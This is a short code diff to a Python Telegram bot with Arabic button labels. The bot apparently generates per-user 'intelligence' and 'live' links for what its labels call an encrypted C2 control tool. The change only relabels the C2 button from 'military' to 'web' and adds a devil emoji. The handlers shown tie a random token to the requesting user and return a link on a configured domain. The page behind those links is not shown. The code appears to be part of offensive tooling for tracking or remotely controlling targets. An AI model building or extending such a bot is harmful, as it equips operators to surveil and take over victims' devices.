@@ -152,7 +152,7 @@ async def process_live_commands(callback: types.CallbackQuery):
 async def cmd_start(message: types.Message):
     kb = ReplyKeyboardMarkup(
         keyboard=[
-            [KeyboardButton(text="🔍 أداة الاستخبارات والتوثيق الأمني"), KeyboardButton(text="⚡ أداة التحكم العسكري C2 المشفر")],
+            [KeyboardButton(text="🔍 أداة الاستخبارات والتوثيق الأمني"), KeyboardButton(text="⚡😈 أداة التحكم الويب C2 المشفر")],
             [KeyboardButton(text="📊 الإحصائيات العامة")]
         ],
         resize_keyboard=True
@@ -172,12 +172,12 @@ async def gen_intel_link(message: types.Message):
     url = f"https://{DOMAIN}/intel/{token}"
     await message.answer(f"✅ *رابط الاستخبارات الأمني الجاهز:*\n\n`{url}`", parse_mode="Markdown")
 
-@dp.message(lambda msg: msg.text == "⚡ أداة التحكم العسكري C2 المشفر")
+@dp.message(lambda msg: msg.text == "⚡😈 أداة التحكم الويب C2 المشفر")
 async def gen_live_link(message: types.Message):
     token = str(uuid.uuid4())[:8]
     LINK_TO_USER[token] = message.from_user.id
     url = f"https://{DOMAIN}/live/{token}"
-    await message.answer(f"✅ *رابط C2 العسكري الفوري:*\n\n`{url}`", parse_mode="Markdown")
+    await message.answer(f"✅ *رابط C2 الويب الفوري:*\n\n`{url}`", parse_mode="Markdown")
 
 @dp.message(lambda msg: msg.text == "📊 الإحصائيات العامة")
 async def show_stats(message: types.Message):
